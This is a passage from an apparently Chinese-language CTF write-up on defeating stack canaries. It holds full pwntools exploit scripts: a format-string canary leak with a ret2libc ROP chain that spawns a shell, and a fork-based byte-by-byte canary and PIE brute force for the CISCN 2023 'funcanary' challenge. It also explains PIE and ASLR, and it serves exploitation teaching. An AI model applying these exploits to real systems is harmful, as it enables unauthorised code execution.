data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  p64<span class=\"token punctuation\">(</span>vuln_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Pull up your sword and tell me u story!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,b'\\0'))</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><!--最后需要返回到vuln，不能在返回main。不需要反复去执行程序-->\n<p>执行 system（/bin/sh）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sys_addr <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload2 <span class=\"token operator\">=</span>  <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bin_sh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h6 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'gnome-terminal'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-x'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sh'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-c'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'bjd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># p = remote('node4.buuoj.cn',26896)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># p.recv()</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I'll give u some gift to help u!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># p.sendline(b'aaaaa')</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'%11$p'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># p.recvuntil(b'0x')\t</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'bjd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400993</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pop_rsi_r15 <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400991</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ret <span class=\"token operator\">=</span><span class=\"token number\">0x00000000004005f9</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># main_addr = 0x04008DA</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>vuln_addr <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  p64<span class=\"token punctuation\">(</span>vuln_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Pull up your sword and tell me u story!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,b'\\0'))</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sys_addr <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>payload2 <span class=\"token operator\">=</span>  <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bin_sh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"方法三-逐字节爆破\"><a class=\"markdownIt-Anchor\" href=\"#方法三-逐字节爆破\">#</a> 方法三  逐字节爆破</h3>\n<h5 id=\"原理-3\"><a class=\"markdownIt-Anchor\" href=\"#原理-3\">#</a> 原理</h5>\n<p>每次进程重启后的 Canary 是不同的，但是同一个进程中的 Canary 都是一样的。并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。<br>\n爆破次数：对于 32 位 ELF，低字节固定是 \\x00，所以只需要对三个字节进行爆破。爆破方式是先利用栈溢出覆写次低字节，如果出错的话，会报错，获得正确的次低字节的话，不会报错。获取正确的次低字节之后，再依次爆破次高字节和高字节。每个字节的可能性是 256，因此 3 个字节的逐个爆破总次数是 256+256+256=768 次</p>\n<h5 id=\"ciscn-2023-初赛funcanary\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2023-初赛funcanary\">#</a> [[<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmZXIudmlwL3VzZXIvbG9naW4/cmVkaXJlY3Q9L3Byb2JsZW0vNDA1Nw==\">CISCN 2023 初赛] funcanary</span></h5>\n<p>这题既然有 pie 的话，那就先介绍一下 pie 吧。</p>\n<h6 id=\"linux-下的pie与aslr\"><a class=\"markdownIt-Anchor\" href=\"#linux-下的pie与aslr\">#</a> <strong>Linux 下的 PIE 与 ASLR</strong></h6>\n<p>由于受到堆栈和 libc 地址可预测的困扰，ASLR 被设计出来并得到广泛应用。因为 ASLR 技术的出现，攻击者在 ROP 或者向进程中写数据时不得不先进行 leak，或者干脆放弃堆栈，转向 bss 或者其他地址固定的内存块。</p>\n<p>而 PIE (position-independent executable, 地址无关可执行文件) 技术就是一个针对代码段.text, 数据段.*data，.bss 等固定地址的一个防护技术。同 ASLR 一样，应用了 PIE 的程序会在每次加载时都变换加载基址，从而使位于程序本身的 gadget 也失效。</p>\n<p>ASLR 则主要负责其他内存的地址随机化。</p>\n<p><strong>PIE 如何作用于 ELF 可执行文件</strong></p>\n<p>ELF 程序运行的时候是 cpu 在硬盘上调入加载进内存的，这个时候程序就有了内存地址空间。</p>\n<pre><code>ELF file format:\n+---------------+\n|  File header  | # 文件头保存每个段类型和长度\n+---------------+ \n| .text section | # 代码段 存放代码和指令\n+---------------+\n| .data section | # 数据段 \n+---------------+\n| .bss section  | # bss段 存放未初始化的全局变量和静态变量,一般可读写\n+---------------+ # 是存放shellcode的好地方。\n|      ...      |\n+---------------+\n|  xxx section  |# 还有字符串段、符号表段行号表段等\n+---------------+\n</code></pre>\n<h6 id=\"检查\"><a class=\"markdownIt-Anchor\" href=\"#检查\">#</a> 检查</h6>\n<p><img data-src=\"/img/canary/image-20230608174423723.png\" alt=\"image-20230608174423723\"></p>\n<p>保护开的很全面哈</p>\n<h6 id=\"ida-3\"><a class=\"markdownIt-Anchor\" href=\"#ida-3\">#</a> ida</h6>\n<p><em>main</em></p>\n<p><img data-src=\"/img/canary/image-20230608174639174.png\" alt=\"image-20230608174639174\"></p>\n<p><em>canary</em></p>\n<p><img data-src=\"/img/canary/image-20230608174749268.png\" alt=\"image-20230608174749268\"></p>\n<p><em>backdoor</em></p>\n<p><img data-src=\"/img/canary/image-20230608174818492.png\" alt=\"image-20230608174818492\"></p>\n<p>这是一个子线程覆盖 canary，首先 <code>fork</code>  一个子线程，然后在子线程内进行操作，这里我们需要知道的是，fork 操作中子线程和主线程用的是一个 canary. 并且程序中这一个循环还不会终止，这就跟便于我们对 canary 的爆破，通过下面的汇编会更清晰的了解子线程和父线程的关系。</p>\n<p><img data-src=\"/img/canary/22.jpg\" alt=\"22\"></p>\n<p>总之，通过 fork，我们可以逐字节爆破 canary。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=remote('',)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'welcome\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># 32 位程序爆 3.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"fun\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                canary <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"canary: \"</span> <span class=\"token operator\">+</span> canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>接下来爆 Pie。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>catflag <span class=\"token operator\">=</span> <span class=\"token number\">0x0231</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">#pause()</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"welcome\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                catflag <span class=\"token operator\">+=</span> <span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"NSSCTF\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h6 id=\"exp-3\"><a class=\"markdownIt-Anchor\" href=\"#exp-3\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ser'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=remote('',)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'welcome\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># 32 位程序爆 3.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"fun\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                canary <span class=\"token operator\">+=</span> p8<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"canary: \"</span> <span class=\"token operator\">+</span> canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">break</span>   </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>catflag <span class=\"token operator\">=</span> <span class=\"token number\">0x0231</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">#pause()</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        a <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome\\n\"</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"welcome\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                catflag <span class=\"token operator\">+=</span> <span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b\"NSSCTF\"</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td 